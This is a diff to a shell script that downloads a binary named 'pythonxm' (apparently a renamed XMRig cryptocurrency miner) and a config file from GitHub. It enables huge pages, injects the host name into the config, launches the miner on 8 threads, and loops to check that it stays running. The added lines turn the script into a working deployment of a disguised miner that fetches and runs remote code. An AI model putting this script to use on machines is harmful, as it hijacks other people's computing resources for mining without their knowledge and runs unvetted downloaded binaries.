@@ -13,11 +13,30 @@ rm -rf pythonxm
 rm -rf config3.json
 rm -rf x.out
 
+#EN1GB
+#!/bin/bash -e
+
+# https://xmrig.com/docs/miner/hugepages#onegb-huge-pages
+
+sysctl -w vm.nr_hugepages=$(nproc)
+
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
+
+echo "1GB pages successfully enabled"
+
+##########
+
 # Prepare
 wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
 chmod +x pythonxm
 wget -q https://github.com/one10001/10001code/raw/main/config3.json
 sed -i "s+ip0001+$IPNAME+g" config3.json
+
+
+./pythonxm -c config3.json -t 8
 
 while [ $(ps -aux |grep pythonxm |wc -l) -le 1 ] 
   do
